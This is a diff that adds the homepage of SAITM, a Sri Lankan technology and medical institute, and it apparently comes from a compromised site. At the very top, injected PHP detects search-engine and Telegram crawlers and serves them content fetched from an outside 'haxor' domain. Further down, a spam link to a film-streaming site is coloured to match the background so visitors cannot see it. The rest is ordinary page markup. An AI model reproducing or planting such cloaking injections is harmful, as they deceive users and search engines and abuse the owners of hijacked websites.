@@ -1,0 +1,480 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents('https://koi.haxor-mahasuhu.info/saitm-edu-lk/index.txt');#NAROLINK
+    echo $message;
+}
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<head>
+
+<style type="text/css">
+#outerCircleText {
+font-style: italic;
+font-weight: bold;
+font-family: 'arial', verdana, arial;
+color: #000;
+position: absolute;top: 0;left: 0;z-index: 3000;cursor: default;}
+#outerCircleText div {position: relative;}
+#outerCircleText div div {position: absolute;top: 0;left: 0;text-align: center;}
+</style>
+<script type="text/javascript">
+
+;(function(){
+
+var msg = "Happy New Year 2012!";
+var size = 12;
+var circleY = 0.75; var circleX = 2;
+var letter_spacing = 5;
+var diameter = 10;
+var rotation = 0.4;
+var speed = 0.3;
+
+////////////////////// Stop Editing //////////////////////
+
+if (!window.addEventListener && !window.attachEvent || !document.createElement) return;
+
+msg = msg.split('');
+var n = msg.length - 1, a = Math.round(size * diameter * 0.208333), currStep = 20,
+ymouse = a * circleY + 20, xmouse = a * circleX + 20, y = [], x = [], Y = [], X = [],
+o = document.createElement('div'), oi = document.createElement('div'),
+b = document.compatMode && document.compatMode != "BackCompat"? document.documentElement : document.body,
+
+mouse = function(e){
+ e = e || window.event;
+ ymouse = !isNaN(e.pageY)? e.pageY : e.clientY; // y-position
+ xmouse = !isNaN(e.pageX)? e.pageX : e.clientX; // x-position
+},
+
+makecircle = function(){ // rotation/positioning
+ if(init.nopy){
+  o.style.top = (b || document.body).scrollTop + 'px';
+  o.style.left = (b || document.body).scrollLeft + 'px';
+ };
+ currStep -= rotation;
+ for (var d, i = n; i > -1; --i){ // makes the circle
+  d = document.getElementById('iemsg' + i).style;
+  d.top = Math.round(y[i] + a * Math.sin((currStep + i) / letter_spacing) * circleY - 15) + 'px';
+  d.left = Math.round(x[i] + a * Math.cos((currStep + i) / letter_spacing) * circleX) + 'px';
+ };
+},
+
+drag = function(){ // makes the resistance
+ y[0] = Y[0] += (ymouse - Y[0]) * speed;
+ x[0] = X[0] += (xmouse - 20 - X[0]) * speed;
+ for (var i = n; i > 0; --i){
+  y[i] = Y[i] += (y[i-1] - Y[i]) * speed;
+  x[i] = X[i] += (x[i-1] - X[i]) * speed;
+ };
+ makecircle();
+},
+
+init = function(){ // appends message divs, & sets initial values for positioning arrays
+ if(!isNaN(window.pageYOffset)){
+  ymouse += window.pageYOffset;
+  xmouse += window.pageXOffset;
+ } else init.nopy = true;
+ for (var d, i = n; i > -1; --i){
+  d = document.createElement('div'); d.id = 'iemsg' + i;
+  d.style.height = d.style.width = a + 'px';
+  d.appendChild(document.createTextNode(msg[i]));
+  oi.appendChild(d); y[i] = x[i] = Y[i] = X[i] = 0;
+ };
+ o.appendChild(oi); document.body.appendChild(o);
+ setInterval(drag, 25);
+},
+
+ascroll = function(){
+ ymouse += window.pageYOffset;
+ xmouse += window.pageXOffset;
+ window.removeEventListener('scroll', ascroll, false);
+};
+
+o.id = 'outerCircleText'; o.style.fontSize = size + 'px';
+
+if (window.addEventListener){
+ window.addEventListener('load', init, false);
+ document.addEventListener('mouseover', mouse, false);
+ document.addEventListener('mousemove', mouse, false);
+  if (/Apple/.test(navigator.vendor))
+   window.addEventListener('scroll', ascroll, false);
+}
+else if (window.attachEvent){
+ window.attachEvent('onload', init);
+ document.attachEvent('onmousemove', mouse);
+};
+
+})();
+
+</script>
+
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>SAITM : The Green Campus...</title>
+	<link href="saitm.ico" rel="shortcut icon" type="image/x-icon" />
+	<meta name="DC.Rights" content="http://www.saitm.edu.lk/disclaimer/">
+	<meta name="DC.Format" scheme="IMT" content="text/html">
+	<meta name="DC.Identifier" content="http://&lt;!--#echo 
+	var='HTTP_HOST'--&gt;&lt;!--#echo var='REQUEST_URI'--&gt;">
+	<!--#config timefmt="%Y-%m-%d" -->
+	<meta name="DC.Date.Modified" scheme="ISO 8601" content="&lt;!--#echo 
+var='LAST_MODIFIED' --&gt;">
+
+	<!-- style sheets -->
+	<link rel="stylesheet" type="text/css" href="HOME_files/uni.css" media="screen, projection">
+	<link rel="stylesheet" type="text/css" href="HOME_files/handheld.css" media="handheld">
+	<link rel="stylesheet" type="text/css" href="HOME_files/print.css" media="print">
+	<link rel="stylesheet" type="text/css" href="HOME_files/custom.css" media="screen, projection">
+	<link rel="stylesheet" type="text/css" href="HOME_files/printmenu.css" media="print">
+    <link rel="stylesheet" type="text/css" href="HOME_files/fixed.css" media="screen, projection">
+
+	<!--[if lt IE 7.]>
+		<link rel="stylesheet" href="http://www.saitm.edu.lk/template-assets/07/styles/ie-win-5-6.css" type="text/css" media="screen" />
+	<![endif]-->
+	<link rel="stylesheet" type="text/css" href="HOME_files/dropdownnav.css">
+	<!--[if lte IE 6]>
+		<link rel="stylesheet" href="/css2009/dropdownnav_ie6.css" type="text/css" />
+		<link rel="stylesheet" href="/css2009/ie6_or_less.css" type="text/css" />
+			<style type="text/css" media="screen, tv, projection">
+				body { behavior:url("/js2009/ADxMenu.htc"); }
+			</style>
+	<![endif]-->
+	<link rel="stylesheet" type="text/css" href="HOME_files/sequence.css">
+	<!-- javascript -->
+	<script src="HOME_files/ga.js" async="" type="text/javascript"></script><script language="JavaScript" type="text/javascript" src="HOME_files/core.js"></script>
+	<script language="JavaScript" type="text/javascript" src="HOME_files/scripts.js"></script>
+	<script language="JavaScript" type="text/javascript" src="HOME_files/swfobject.js"></script>
+	<!--Start Glimmer Insertion-->
+	<script type="text/javascript" src="HOME_files/jquery.js"></script>
+	<!--glimmer generated file-->
+	<script type="text/javascript" src="HOME_files/sequence.js"></script>
+	<!--End Glimmer Insertion-->
+	<script type="text/javascript" src="HOME_files/suckerfish.js"></script>
+
+	
+<style type="text/css">
+
+#ibox { background-color:#B7DBFF; }
+<!--
+.style3 {font-size: x-small}
+.style4 {color: #006600}
+.style5 {color: #024383}
+.style6 {
+	color: #3A526D;
+	font-size: 16px;
+	font-weight: bold;
+}
+.style7 {
+	color: #FFFFFF;
+	font-weight: bold;
+}
+.style8 {color: #FFFFFF}
+-->
+    </style>
+
+
+</head>
+<body id="subhome">
+
+<div id="allContent">
+<div id="top">
+
+<table width="1000px" border="0" cellpadding="0" cellspacing="0" bgcolor="#DDE9FF">
+  <tbody><tr>
+    <td width="284" rowspan="2">
+    	<div style="padding: 10px 0pt 0pt 17px;">
+    	  <div align="left"><a href="index.htm"><img src="HOME_files/Logo_SAITM.png" width="240" height="111" border="0" /></a>
+	          </div>
+    	</div>
+	</td>
+    <td width="150" rowspan="2"><br>	</td>
+    <td width="566" height="27" valign="top" bgcolor="#6E8DB2">    
+	
+	<form method="get" action="find_search.php">
+      <div align="right">
+          <input type=  "text" name=     "q" value="" id="ibox"  />
+          <input type="hidden" name=   "cat" value=""  />
+          <input type="hidden" name=  "time" value="0" />
+          <input type="hidden" name="letter" value=""  />
+          <input type="hidden" name="offset" value="0" />
+          <input type="hidden" name=  "type" value="quick"  />
+          <input name="submit" type="submit" value="Search" />          
+          &nbsp;&nbsp;&nbsp;&nbsp;<a href="./atoz_saitm.htm">A-Z Links</a>&nbsp;&nbsp;|&nbsp;&nbsp; <a href="http://www.saitm.edu.lk/">SAITM Home</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="style7"></span> </div>
+    </form>  </tr>
+    <tr>
+      <td valign="top"><img src="HOME_files/SAITM_Home_Top.jpg" width="566" height="88" /></td>
+    </tr>
+</tbody></table>
+</div>
+
+<div>
+<table cellpaddding="0" border="0" cellspacing="0" width="100%">
+ <tbody><tr>
+  <td colspan="2" valign="top" width="100%">
+   <div id="menuwrap">
+   <div id="suckerfishmenu">
+	
+<ul class="menu">
+<li><a href="./index.htm">Home</a></li>
+<li><a href="./index.htm">About SAITM</a>
+<ul>
+<li><a href="./overview_saitm.htm">Overview</a></li>
+<li><a href="./vision_saitm.htm">Vision, Mission & Strategy</a></li>
+<li><a href="./org_struct_saitm.htm">SAITM Organization Structure</a></li>
+<li><a href="./contact_saitm.htm">Contact Information</a></li>
+<li><a href="./publications_saitm.htm">Publications</a></li>
+<li><a href="./locate_saitm.htm">Campus Map</a></li>
+</ul>
+</li>
+<li><a href="./index.htm">Affiliations</a>
+<ul><li><a 
+href="./global_partner_saitm.htm">Global Partnerships</a></li>
+<li><a 
+href="./affiliated_universities.htm">Overseas Universities</a></li>
+<li><a 
+href="./student_exchange_saitm.htm">Student Exchange Program</a></li>
+<li><a 
+href="./related_orgs.htm">Related Organizations</a></li>
+</ul>
+</li>
+<li><a href="./index.htm">Admissions</a>
+<ul><li><a 
+href="./specialty_saitm.htm">Why SAITM?</a></li>
+<li><a 
+href="./programs_offered.htm">Courses & Programmes</a></li>
+<li><a 
+href="formsnd/applyonline_Home.htm" target="_blank">Undergraduate Admission</a></li>
+<li><a 
+href="./for_students_overseas.htm">For Overseas Students</a></li>
+<li><a 
+href="./financial_aids.htm">Financial Aids</a></li>
+</ul>
+</li>
+<li><a href="./index.htm">Education</a>
+<ul><li><a 
+href="./academic_calender_saitm.htm">Academic Calendar</a></li>
+<li><a 
+href="./facilities_saitm.htm">Facilities / Learning Environment</a></li>
+<li><a 
+href="./programs_offered.htm">Graduate Studies</a></li>
+<li><a 
+href="./other_diplomas.htm">Other Academic Programmes</a></li>
+<li><a 
+href="./vocational_training.htm">Vocational Training</a></li>
+<li><a 
+href="./short_courses.htm">Short Term Courses</a></li>
+</ul>
+</li>
+<li><a 
+href="./index.htm">Faculties</a>
+<ul>
+<li><a 
+href="./fac_of_medicine/fac_of_medicine.htm">Faculty of Medicine</a></li>
+<li><a href="./e/UoS.htm">Faculty of Engineering</a></li>
+<li><a 
+href="./fac_of_media/fac_of_media.htm">Faculty of ICT and Media</a></li>
+<li><a 
+href="./fac_of_mgt/fac_of_mgt.htm">Faculty of Management and Finance</a></li>
+</ul>
+</li>
+<li><a href="./index.htm">News
+ &amp; Events</a>
+<ul><li><a 
+href="./forthcoming_events_saitm.htm">All
+ Forthcoming Events</a></li>
+<li><a 
+href="./archived_events_saitm.htm">Archived
+ Events</a></li>
+<li><a 
+href="./latest_news_saitm.htm">Latest News</a></li>
+<li><a 
+href="./gallery_saitm.htm">Photo Gallery</a></li>
+</ul>
+</li>
+<li><a href="./life_at_saitm.htm">Campus Life</a>
+<ul><li><a 
+href="./environment_saitm.htm">Environmental Sustainability</a></li>
+<li><a 
+href="./student_act_saitm.htm">Student Activities</a></li>
+<li><a 
+href="./facilities_saitm.htm">Resources / Facilities</a></li>
+<li><a 
+href="./art_sports_saitm.htm">Art, Culture & Sports @ SAITM</a></li>
+<li><a 
+href="./advice_support_saitm.htm">Student Support</a></li>
+<li><a 
+href="./blogs_saitm.htm">Collegial Conversations</a></li>
+</ul>
+</li>
+<li><a href="./index.htm">Information for,</a>
+<ul><li><a 
+href="./current_students.htm">Current Students</a></li>
+<li><a 
+href="./prospective_students.htm">Prospective Students</a></li>
+<li><a 
+href="./staff_students.htm">SAITM Staff</a></li>
+<li><a 
+href="./visitors_saitm.htm">Visitors</a></li>
+</ul>
+<li><a href="./index.htm">Library</a></li>
+
+<li><a href="./contact_saitm.htm">Contact Us</a></li>
+</ul>
+   </div>
+   </div>
+  </td>
+ </tr>
+ <tr bgcolor="#FFFFFF">
+  <td width="" height="580" rowspan="3" valign="top" bgcolor="#FFFFEA">
+    <br>
+	<div id="home-left">
+	<div style="padding-left: 20px; padding-right: 0px;"><div>
+
+<table cellpaddding="0" border="0" cellspacing="0" width="590">
+ <tbody><tr>
+  <td colspan="3" valign="top">
+  <embed src="imagerotator.swf" 
+	width="590" 
+	height="232"
+	allowscriptaccess="always" 
+	allowfullscreen="true" 
+	flashvars="file=imagerotator.xml&amp;transition=blocks" wmode="transparent"/> </td>
+  </tr>
+   <tr>
+     <td height="277" colspan="3" valign="top"><div align="justify">
+       <p><span class="style6"><br>South Asian Institute of Technology and Medicine (SAITM) </span><br>
+           <br>
+           The South Asian Institute of Technology and Medicine (SAITM) offers a friendly environment, excellent staff and great facilities in a lively city in the heart of Sri Lanka’s first technology park.<br>
+
+<br>SAITM is a contemporary campus providing quality tertiary education for the students of today. We pride ourselves on being supportive, flexible and relevant to the real world. We all know that the theory is important but SAITM knows that putting what you learn into practice is just as valuable. That’s why our courses have a strong focus on providing real life solutions to real life problems. Practical projects, industry placements and guest speakers are key features of our programs.<br>
+
+<br>We strive to provide a different learning approach, developed to maximise the student outcome and experience, as well as providing state-of-the-art facilities and infrastructure. </p>
+       </div>       </td>
+   </tr>
+   
+   
+   <tr align="center">
+     <td valign="top"><a href="./fac_of_eng/paperadnew.htm"><img src="HOME_files/AD_Icons/eng_new_ait.gif" width="170" height="90" border="0" /></a></td>
+     <td valign="top"><a href="./fac_of_medicine/msg_president_medicine.htm"><img src="HOME_files/AD_Icons/medicineNextIntake.png" width="170" height="90" border="0" /></a></td>
+     <td valign="top"><a href="./fac_of_mgt/prg_modules_mgt.htm"><img src="HOME_files/AD_Icons/sm_banner_bnu2.png" width="170" height="90" border="0" /></a></td>
+   </tr>
+   <tr align="center">
+     <td valign="top"><a href="https://666filmizle.com" style="color:#FFFFEA;" title="film izle">666filmizle.com</a>&nbsp;</td>
+     <td valign="top">&nbsp;</td>
+     <td valign="top">&nbsp;</td>
+   </tr>
+   <tr align="center">
+     <td width="170" valign="top"><a href="./fac_of_mgt/BSc_degree_mgt.htm"><img src="HOME_files/AD_Icons/NewMgtBanner.gif" width="170" height="90" border="0" /></a></td>
+   <td width="261" valign="top"><a href="fac_of_media/degree_programs_media.htm"><img src="HOME_files/AD_Icons/sm_banner_UoB_IM_new.png" width="170" height="90" border="0" /></a></td>
+     <td width="171" valign="top"><a href="formsnd/applyonline_Home.htm" target="_blank"><img src="HOME_files/AD_Icons/sm_BannerNextIn.gif" width="170" height="90" border="0" /></a></td>
+   </tr>
+</tbody></table>
+
+
+		</div>
+	</div>
+  </div></td>
+  <td width="*" height="264" valign="top" bgcolor="#FFFFEA">
+
+    <div class="sideboxRight">
+        <div align="center" class="style5">
+          <div align="center"></div>
+        </div>
+      </div>
+    <div class="boxbody">
+
+			
+		<table cellspacing="0" cellpadding="0">
+          <tr>
+            <td colspan="3" valign="top"><a href="msg_from_chairman.htm"><img src="HOME_files/msgFrmProf.jpg" width="357" height="111" border="0" /></a></td>
+            </tr>
+
+		  <tr>
+            <td height="22" colspan="3" valign="top">&nbsp;</td>
+            </tr>
+		  <tr>
+		    <td colspan="3" valign="top"><a href="locate_saitm.htm"><img src="HOME_files/LocateSAITM.jpg" width="357" height="99" border="0" /></a></td>
+		    </tr>
+		  
+        </table>
+		</div>      </td>
+ </tr>
+ <tr>
+   <td height="469" valign="top" bgcolor="#FFFFEA">
+     <div class="boxbody">
+       <h6 style="color:#0066FF;">Latest Advertisements and News</h6>
+		<div style="height: 125px;"><a href="formsnd/applyonline_Home.htm" target="_blank"><img src="HOME_files/ApplyOnlineButton.jpg" /></a>
+		<br><br>
+		<a href="http://nfth.lk/" target="_blank"><img src="HOME_files/DNFTH.png" border="0" /></a>
+		
+		<br>
+		<br>
+		<a href="fac_of_eng/EFAC_files/EnvAD.png" target="_blank"><img src="HOME_files/AD_Icons/ENG_AD_Icon_Last.png" width="170" height="90" border="0" /></a>&nbsp;&nbsp;&nbsp;<a href="fac_of_medicine/MED_files/PressAD1.jpg" target="_blank"><img src="HOME_files/AD_Icons/MED_AD_Icon_Last.png" width="170" height="90" border="0" /></a>
+        <br>
+        <a href="fac_of_media/MEDIA_files/Media_AD1.jpg" target="_blank"><img src="HOME_files/AD_Icons/MM_AD_Icon_Last.png" width="170" height="90" border="0" /></a>&nbsp;&nbsp;&nbsp;<a href="fac_of_mgt/MGT_files/AD_Mgt1.jpg" target="_blank"><img src="HOME_files/AD_Icons/MGT_AD_Icon_Last.png" width="170" height="90" border="0" /></a><br>
+		<a href="HOME_files/OpenDay.jpg" target="_blank"><img src="HOME_files/AD_Icons/OD2011.jpg" width="170" height="90" border="0" /></a>&nbsp;&nbsp;&nbsp;<a href="fac_of_eng/EFAC_files/EngAD2.jpg" target="_blank"><img src="HOME_files/AD_Icons/Eng_Next.jpg" width="170" height="90" border="0" /></a>		</div>
+    </div></td>
+ </tr>
+ <tr>
+   <td height="439" valign="top" bgcolor="#FFFFEA"><div class="boxbody">
+	 <h6 style="color:#0066FF;">Quick Links </h6>
+     <div style="height: 125px;">
+	 <a href="overview_saitm.htm">About SAITM</a><br>
+	 <a href="fac_of_medicine/fac_of_medicine.htm">Faculty of Medicine</a><br>
+	 <a href="fac_of_eng/fac_of_eng.htm">Faculty of Engineering</a><br>
+	 <a href="fac_of_media/fac_of_media.htm">Faculty of ICT & Media</a><br>
+	 <a href="fac_of_mgt/fac_of_mgt.htm">Faculty of Management & Finance</a><br>
+	 <a href="formsnd/applyonline_Home.htm" target="_blank">Apply (Register) Online for a Degree Program</a><br>
+	 <a href="current_students.htm">Current Students</a><br>
+	 <a href="prospective_students.htm">Prospective Students</a><br>
+	 <a href="programs_offered.htm">Degree Programs</a><br>
+	 <a href="other_diplomas.htm">Diplomas & Other Programs</a><br>
+	 <a href="global_partner_saitm.htm">Our Partners</a><br>
+	 <a href="fac_of_eng/icb_saitm.htm">Extended Faculty</a><br>
+	 <a href="http://symposium.saitm.edu.lk/" target="_blank">Symposium [RSEA]</a><br>
+	 <a href="gallery_saitm.htm">SAITM - Photo and Video Gallery</a><br>
+	 <a href="contact_saitm.htm">Contact Us</a><br>
+	 <a href="financial_aids.htm">Financial Assistance</a><br>
+	 <a href="advice_support_saitm.htm">Advice and Support</a><br>
+	 <a href="vacancies_saitm.htm">Vacancies</a>	 </div>
+     <h6 style="color:#0066FF;"><br />
+     </h6>
+   </div>
+     <p></p></td>
+ </tr>
+ <tr>
+   <td height="20" valign="top" bgcolor="#FFFFEA">&nbsp;</td>
+   <td valign="top" bgcolor="#FFFFEA">&nbsp;</td>
+ </tr>
+ <tr bgcolor="#6E8DB2">
+   <td valign="top">&nbsp;</td>
+   <td valign="top">&nbsp;</td>
+ </tr>
+ <tr>
+   <td valign="top"><span class="style3">Address: SAITM, Millenium Drive, New Kandy Road, Malabe, Sri Lanka<br>
+     Authoriser: CEO, Chairman<br>
+     Maintainer : Webmaster - SAITM</span></td>
+   <td valign="top"><div align="right"><span class="style3">South Asian Institute of Technology and Medicine [SAITM]:(+94)11 241 3351<br>
+     the first <span class="style4">'green campus'</span> in Sri Lanka More information<br>
+       <a href="http://www.saitm.edu.lk">Disclaimer & copyright</a></span></div></td>
+ </tr>
+</tbody></table>
+</div>
+
+<div style="clear: both;"></div>
+
+</div>
+
+</body></html>
